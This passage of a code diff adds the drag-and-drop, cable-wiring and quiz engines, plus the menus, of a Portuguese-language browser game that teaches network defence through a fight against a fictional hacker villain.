+  cleanup(); sfx.lose(); stopMusic(); setTimeout(() => music('menu'), 2500);
+  modal(`<div class="tag">FALHA NA DEFESA</div><h2>Rede comprometida</h2>
+    <div class="dlg"><div class="av">${AV_Z}</div><div class="bubble z"><span class="who">Z3R0</span>${msg} Hahaha!</div></div>
+    <div class="learn"><b>DICA</b>${LEVELS[S.cur].tip}</div>
+    <div class="row"><button class="btn ghostb" id="mMap">MAPA</button><button class="btn" id="mRetry">TENTAR DE NOVO</button></div>`);
+  $('mMap').onclick = () => { closeModal(); goMap(); };
+  $('mRetry').onclick = () => { closeModal(); startLevel(S.cur); };
+}
+function goMap() { cleanup(); renderMap(); show('map'); music('menu'); }
+$('backBtn').onclick = goMap;
+$('tipBtn').onclick = () => {
+  const L = LEVELS[S.cur];
+  modal(`<div class="tag">DICA TÉCNICA</div><h2>${L.title}</h2><div class="learn">${L.tip}</div><div class="row"><button class="btn ghostb" id="sndG">SOM: ${muted ? 'OFF' : 'ON'}</button><button class="btn" id="mOk">ENTENDI</button></div>`);
+  $('mOk').onclick = closeModal;
+  $('sndG').onclick = () => { au(); setMute(!muted); if (!muted) music(LEVELS[S.cur].boss ? 'boss' : 'play'); };
+};
+
+// ---------- drop engine ----------
+const norm = c => typeof c === 'string' ? { t: c, v: c } : c;
+function renderDrop(L) {
+  const st = $('stage'); st.innerHTML = '';
+  if (L.intro) st.insertAdjacentHTML('beforeend', `<div class="task">${L.intro}</div>`);
+  let chips;
+  if (L.mode === 'slots') {
+    const html = L.html.replace(/\[(\w+)\]/g, (m, id) => `<span class="zone slot${L.wide ? ' wide' : ''}" data-z="${id}">${L.wide ? 'solte aqui' : '?'}</span>`);
+    st.insertAdjacentHTML('beforeend', `<div class="tpl">${html}</div>`);
+    S.need = Object.keys(L.zones).length;
+    chips = L.chips.map(norm);
+  } else {
+    const w = document.createElement('div'); w.className = 'buckets';
+    L.buckets.forEach((b, bi) => w.insertAdjacentHTML('beforeend', `<div class="zone bucket" data-b="${bi}" style="--bc:${b.c}"><div class="bh">${b.label}</div><div class="bl"></div></div>`));
+    st.append(w);
+    const all = []; L.buckets.forEach(b => b.a.forEach(v => all.push(v)));
+    S.need = all.length; chips = all.map(norm);
+  }
+  const bank = $('bank'); bank.innerHTML = `<div class="bankh"><span>ARRASTE OU TOQUE E ESCOLHA O DESTINO</span><span id="bankCnt">0/${S.need}</span></div>`; bank.style.display = 'flex';
+  shuffle(chips).forEach(c => { const d = document.createElement('div'); d.className = 'chip'; d.textContent = c.t; d._c = c; bank.append(d); });
+}
+function zoneAt(x, y) {
+  const el = document.elementFromPoint(x, y), z = el && el.closest('.zone');
+  if (!z || (z.classList.contains('ok') && z.classList.contains('slot'))) return null;
+  return z;
+}
+function clearSel() { if (S.sel) S.sel.classList.remove('sel'); S.sel = null; }
+function tryPlace(chip, zone) {
+  if (S.busy || !chip || chip.classList.contains('used')) return;
+  const L = LEVELS[S.cur], c = chip._c, at = center(zone);
+  let ok;
+  if (zone.dataset.z !== undefined) {
+    if (zone.classList.contains('ok')) return;
+    ok = L.zones[zone.dataset.z].includes(c.v);
+    if (ok) { zone.textContent = c.t; zone.classList.add('ok'); }
+  } else {
+    ok = L.buckets[+zone.dataset.b].a.includes(c.v);
+    if (ok) { const m = document.createElement('div'); m.className = 'mini'; m.textContent = c.t; zone.querySelector('.bl').append(m); }
+  }
+  clearSel();
+  if (ok) {
+    chip.classList.add('used'); S.placed++; good(at, zone.dataset.b !== undefined ? L.buckets[+zone.dataset.b].c : null);
+    const bc = $('bankCnt'); if (bc) bc.textContent = S.placed + '/' + S.need;
+    zone.classList.add('pop'); setTimeout(() => zone.classList.remove('pop'), 320);
+    if (S.placed >= S.need) { S.busy = true; setTimeout(win, 600); }
+  } else { flash(zone); flash(chip); damage(15, at); }
+}
+let D = null, WD = null;
+$('bank').addEventListener('pointerdown', e => {
+  const c = e.target.closest('.chip');
+  if (!c || c.classList.contains('used') || S.busy) return;
+  au();
+  D = { el: c, id: e.pointerId, sx: e.clientX, sy: e.clientY, moved: false, g: null, hz: null, as: 0 };
+});
+$('stage').addEventListener('click', e => {
+  const z = e.target.closest('.zone');
+  if (z && S.sel) tryPlace(S.sel, z);
+});
+
+// ---------- wire engine ----------
+function renderWire(L) {
+  $('bank').style.display = 'none';
+  const st = $('stage'), h = L.heads || ['ORIGEM', 'DESTINO'];
+  st.innerHTML = `<div class="task">${L.goal}</div>
+    <div class="stepper" id="stepper"><div class="num" id="stNum">1</div><div class="txt" id="stTxt"></div><div class="cnt"><b id="stCnt">0/${L.left.length}</b>LINKS UP</div></div>
+    <div class="wire" id="wire"><div class="col" id="colL"><div class="colh">${h[0]}</div></div><div class="col" id="colR"><div class="colh">${h[1]}</div></div><svg class="wires" id="wsvg"></svg></div>`;
+  if (L.legend) st.insertAdjacentHTML('beforeend', `<div class="legend">${Object.values(MEDIA).map(m => `<span><i style="background:${m.c}"></i>${m.n}</span>`).join('')}</div>`);
+  S.need = L.left.length; S.placed = 0; S.pairs = [];
+  const mk = (p, side) => {
+    const d = document.createElement('div');
+    const jc = side === 'L' ? (p.m ? MEDIA[p.m].c : '#00e0a8') : '#5b6b86';
+    const ico = side === 'L' ? (p.m ? MEDIA[p.m].ico : '') : (p.ico || '');
+    d.className = 'port ' + side; d.dataset.id = p.id; d.style.setProperty('--jc', jc); d._c = jc; d._t = p.t;
+    d.innerHTML = `<span class="st"></span><div class="pic">${ico ? icon(ico, side === 'L' ? jc : null) : ''}<div class="t"></div></div>${p.s ? '<div class="s"></div>' : ''}<span class="up">LINK UP</span><span class="jack"></span>`;
+    d.querySelector('.t').textContent = p.t; if (p.s) d.querySelector('.s').textContent = p.s;
+    return d;
+  };
+  L.left.forEach(p => $('colL').append(mk(p, 'L')));
+  shuffle(L.right).forEach(p => $('colR').append(mk(p, 'R')));
+  setStep();
+  requestAnimationFrame(() => drawWires());
+}
+function setStep() {
+  const sp = $('stepper'); if (!sp) return;
+  const two = !!(S.wsel || WD && WD.moved);
+  const src = S.wsel || (WD && WD.p);
+  sp.classList.toggle('two', two);
+  $('stNum').textContent = two ? '2' : '1';
+  $('stTxt').innerHTML = two
+    ? `Agora toque (ou solte o cabo) na porta de destino de <b></b>`
+    : `Toque num item da <b>esquerda</b> ou arraste o cabo pelo conector até a direita.`;
+  if (two) $('stTxt').querySelector('b').textContent = src._t;
+  $('stCnt').textContent = S.placed + '/' + S.need;
+  $('wire').classList.toggle('picking', two);
+}
+function jackPos(port) {
+  const w = $('wire').getBoundingClientRect(), j = port.querySelector('.jack').getBoundingClientRect();
+  return { x: j.left + j.width / 2 - w.left, y: j.top + j.height / 2 - w.top };
+}
+function pathD(a, b) {
+  const dx = Math.max(24, Math.abs(b.x - a.x) * .55) * (b.x >= a.x ? 1 : -1);
+  return `M${a.x} ${a.y} C${a.x + dx} ${a.y + 6} ${b.x - dx} ${b.y + 6} ${b.x} ${b.y}`;
+}
+function drawWires(temp, animIdx) {
+  const svg = $('wsvg'); if (!svg) return;
+  let s = '';
+  S.pairs.forEach((p, i) => {
+    const d = pathD(jackPos(p.l), jackPos(p.r)), cls = i === animIdx ? ' class="wn"' : '';
+    s += `<path${cls} d="${d}" stroke="rgba(0,0,0,.55)" stroke-width="8" fill="none" stroke-linecap="round"/><path${cls} d="${d}" stroke="${p.c}" stroke-width="4.5" fill="none" stroke-linecap="round"/><path${cls} d="${d}" stroke="rgba(255,255,255,.35)" stroke-width="1.2" fill="none" stroke-linecap="round" transform="translate(0,-1.2)"/>`;
+  });
+  if (temp) s += `<path d="${pathD(temp.a, temp.b)}" stroke="${temp.c}" stroke-width="4.5" fill="none" stroke-linecap="round" ${temp.bad ? '' : 'stroke-dasharray="8 6"'}/><circle cx="${temp.b.x}" cy="${temp.b.y}" r="8" fill="${temp.c}" stroke="#0b1220" stroke-width="3"/>`;
+  svg.innerHTML = s;
+  if (animIdx !== undefined) svg.querySelectorAll('.wn').forEach(p => {
+    const len = p.getTotalLength(); p.style.strokeDasharray = len; p.style.strokeDashoffset = len;
+    p.getBoundingClientRect(); p.style.transition = 'stroke-dashoffset .45s ease-out'; p.style.strokeDashoffset = 0;
+  });
+}
+function connect(l, r) {
+  if (S.busy || !l || !r || !l.classList.contains('L') || !r.classList.contains('R')) return;
+  if (l.classList.contains('done') || r.classList.contains('done')) return;
+  const at = center(r);
+  if (l.dataset.id === r.dataset.id) {
+    l.classList.add('done'); r.classList.add('done'); r.style.setProperty('--jc', l._c);
+    S.pairs.push({ l, r, c: l._c }); S.placed++;
+    drawWires(null, S.pairs.length - 1); sfx.plug(); good(at, l._c);
+    if (S.placed >= S.need) { S.busy = true; setTimeout(win, 800); }
+  } else {
+    drawWires({ a: jackPos(l), b: jackPos(r), c: '#ff4d6d', bad: true });
+    setTimeout(() => drawWires(), 450);
+    flash(l); flash(r); damage(15, at);
+  }
+  setStep();
+}
+function wireSel(p) {
+  if (S.wsel) S.wsel.classList.remove('sel');
+  S.wsel = p; if (p) { p.classList.add('sel'); sfx.sel(); }
+  setStep();
+}
+$('stage').addEventListener('pointerdown', e => {
+  const p = e.target.closest('.port');
+  if (!p || p.classList.contains('done') || S.busy) return;
+  au();
+  WD = { p, id: e.pointerId, sx: e.clientX, sy: e.clientY, moved: false };
+});
+
+// ---------- global pointer ----------
+addEventListener('pointermove', e => {
+  if (D && e.pointerId === D.id) {
+    if (!D.moved) {
+      if (Math.hypot(e.clientX - D.sx, e.clientY - D.sy) < 7) return;
+      D.moved = true; clearSel();
+      D.g = D.el.cloneNode(true); D.g.classList.add('ghost'); document.body.append(D.g);
+      D.el.classList.add('dragging');
+    }
+    const gw = D.g.offsetWidth / 2 + 8; D.g.style.left = Math.min(innerWidth - gw, Math.max(gw, e.clientX)) + 'px'; D.g.style.top = e.clientY + 'px';
+    const z = zoneAt(e.clientX, e.clientY);
+    if (z !== D.hz) { if (D.hz) D.hz.classList.remove('hover'); if (z) z.classList.add('hover'); D.hz = z; }
+    const r = $('stage').getBoundingClientRect();
+    D.as = e.clientY < r.top + 60 ? -1 : (e.clientY > r.bottom - 60 && e.clientY < r.bottom + 30) ? 1 : 0;
+  }
+  if (WD && e.pointerId === WD.id && WD.p.classList.contains('L')) {
+    if (!WD.moved) {
+      if (Math.hypot(e.clientX - WD.sx, e.clientY - WD.sy) < 7) return;
+      WD.moved = true; if (S.wsel && S.wsel !== WD.p) S.wsel.classList.remove('sel');
+      S.wsel = null; WD.p.classList.add('sel'); setStep();
+    }
+    const w = $('wire').getBoundingClientRect();
+    drawWires({ a: jackPos(WD.p), b: { x: e.clientX - w.left, y: e.clientY - w.top }, c: WD.p._c });
+    document.querySelectorAll('.port.tgt').forEach(x => x.classList.remove('tgt'));
+    const el = document.elementFromPoint(e.clientX, e.clientY), t = el && el.closest('.port.R:not(.done)');
+    if (t) t.classList.add('tgt');
+    const r = $('stage').getBoundingClientRect();
+    WD.as = e.clientY < r.top + 50 ? -1 : e.clientY > r.bottom - 50 ? 1 : 0;
+  }
+});
+function endPointer(e, cancel) {
+  if (D && e.pointerId === D.id) {
+    const d = D; D = null;
+    if (d.moved) {
+      d.g.remove(); d.el.classList.remove('dragging'); if (d.hz) d.hz.classList.remove('hover');
+      if (!cancel) { const z = zoneAt(e.clientX, e.clientY); if (z) tryPlace(d.el, z); }
+    } else if (!cancel) {
+      if (S.sel === d.el) clearSel(); else { clearSel(); S.sel = d.el; d.el.classList.add('sel'); sfx.sel(); }
+    }
+  }
+  if (WD && e.pointerId === WD.id) {
+    const w = WD; WD = null;
+    document.querySelectorAll('.port.tgt').forEach(x => x.classList.remove('tgt'));
+    if (w.moved) {
+      w.p.classList.remove('sel'); drawWires();
+      if (!cancel) { const el = document.elementFromPoint(e.clientX, e.clientY), t = el && el.closest('.port'); if (t) connect(w.p, t); }
+      setStep();
+    } else if (!cancel) {
+      const isL = w.p.classList.contains('L');
+      if (isL) { if (S.wsel === w.p) wireSel(null); else wireSel(w.p); }
+      else if (S.wsel) { const a = S.wsel; S.wsel.classList.remove('sel'); S.wsel = null; connect(a, w.p); }
+      else toast('Comece pelo item da esquerda.', true);
+    }
+  }
+}
+addEventListener('pointerup', e => endPointer(e, false));
+addEventListener('pointercancel', e => endPointer(e, true));
+(function autoScroll() {
+  if (D && D.moved && D.as) $('stage').scrollTop += D.as * 9;
+  if (WD && WD.moved && WD.as) { $('stage').scrollTop += WD.as * 7; }
+  requestAnimationFrame(autoScroll);
+})();
+addEventListener('resize', () => { if ($('wire')) drawWires(); });
+
+// ---------- quiz ----------
+function renderQuiz(L) {
+  $('bank').style.display = 'none';
+  S.qi = 0; S.hits = 0; S.needHits = L.boss ? Math.ceil(L.qs.length * .7) : L.qs.length;
+  showQ();
+}
+const bossPct = () => Math.max(0, 100 - S.hits / S.needHits * 100);
+function showQ() {
+  const L = LEVELS[S.cur], q = L.qs[S.qi];
+  const opts = shuffle(q.o.map((t, i) => ({ t, ok: i === q.a })));
+  const st = $('stage');
+  st.innerHTML = (L.boss ? `<div class="bossbar"><div class="b"><span>Z3R0 · CONEXÃO C2</span><div class="bb"><div id="bossFill" style="width:${bossPct()}%"></div></div></div></div>` : '')
+    + `<div class="qmeta">PERGUNTA ${S.qi + 1}/${L.qs.length}${L.boss ? ' · ACERTOS ' + S.hits + '/' + S.needHits : ''}</div>`
+    + (L.boss ? `<div class="timer"><div id="tFill"></div></div>` : '')
+    + `<div class="q"></div><div id="opts"></div><div id="whyBox"></div>`;
+  st.querySelector('.q').textContent = q.q;
+  opts.forEach(o => { const b = document.createElement('button'); b.className = 'opt'; b.textContent = o.t; b._ok = o.ok; b.onclick = () => answer(b); $('opts').append(b); });
+  st.scrollTop = 0;
+  if (L.boss) {
+    let left = L.time * 1000;
+    clearInterval(S.timer);
+    S.timer = setInterval(() => {
+      left -= 100;
+      const f = $('tFill'); if (f) { f.style.width = Math.max(0, left / (L.time * 10)) + '%'; f.style.background = left < 5000 ? '#ff4d6d' : ''; }
+      if (left <= 3000 && left % 1000 === 0) sfx.tick();
+      if (left <= 0) { clearInterval(S.timer); answer(null); }
+    }, 100);
+  }
+}
+function answer(btn) {
+  if (S.busy) return;
+  clearInterval(S.timer);
+  const L = LEVELS[S.cur], q = L.qs[S.qi], ok = !!(btn && btn._ok);
+  document.querySelectorAll('.opt').forEach(b => { b.disabled = true; if (b._ok) b.classList.add('right'); });
+  if (btn && !ok) btn.classList.add('wrong');
+  const at = btn ? center(btn) : center($('stage'));
+  if (ok) {
+    S.hits++; good(at);
+    if (L.boss) { sfx.zap(); toast(ZHURT[Math.random() * ZHURT.length | 0], false); const f = $('bossFill'); if (f) f.style.width = bossPct() + '%'; }
+  } else {
+    damage(L.boss ? 20 : 15, at);
+    if (!btn) toast('Tempo esgotado! Hahaha!', false);
+    if (S.hp <= 0) return;
+  }
+  const bossDown = L.boss && S.hits >= S.needHits, lastQ = S.qi >= L.qs.length - 1;
+  const wb = $('whyBox');
+  wb.innerHTML = `<div class="why"><b style="color:${ok ? 'var(--acc)' : 'var(--bad)'}">${ok ? 'Correto.' : (btn ? 'Errado.' : 'Tempo esgotado.')}</b> <span></span><button class="btn" id="qNext">${bossDown ? 'DERRUBAR O Z3R0' : lastQ ? 'FINALIZAR' : 'CONTINUAR'}</button></div>`;
+  wb.querySelector('span').textContent = q.why;
+  wb.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+  $('qNext').onclick = () => {
+    if (bossDown) { win(); return; }
+    if (lastQ) { if (L.boss) { S.busy = true; fail('Você não acertou o suficiente e o Z3R0 escapou pela VPN.'); } else win(); return; }
+    S.qi++; showQ();
+  };
+}
+
+// ---------- title ----------
+$('goMap').onclick = () => { au(); renderMap(); show('map'); music('menu'); };
+$('sndT').onclick = () => { au(); setMute(!muted); if (!muted) music(MUS.cur || 'menu'); };
+$('sndM').onclick = () => { au(); setMute(!muted); if (!muted) music('menu'); };
+setMute(muted);
+$('resetBtn').onclick = () => {
+  modal(`<h2>Zerar progresso?</h2><div class="learn">Todas as estrelas, pontos e fases desbloqueadas serão apagados.</div><div class="row"><button class="btn ghostb" id="mNo">CANCELAR</button><button class="btn" id="mYes">ZERAR</button></div>`);
+  $('mNo').onclick = closeModal;
+  $('mYes').onclick = () => { S.prog = {}; S.best = {}; save(); closeModal(); };
+};
+$('modal').addEventListener('click', e => { if (e.target.id === 'modal' && $('mcard').querySelector('#mCancel,#mOk,#mNo')) closeModal(); });
+})();
+</script>
+</body>
+</html>
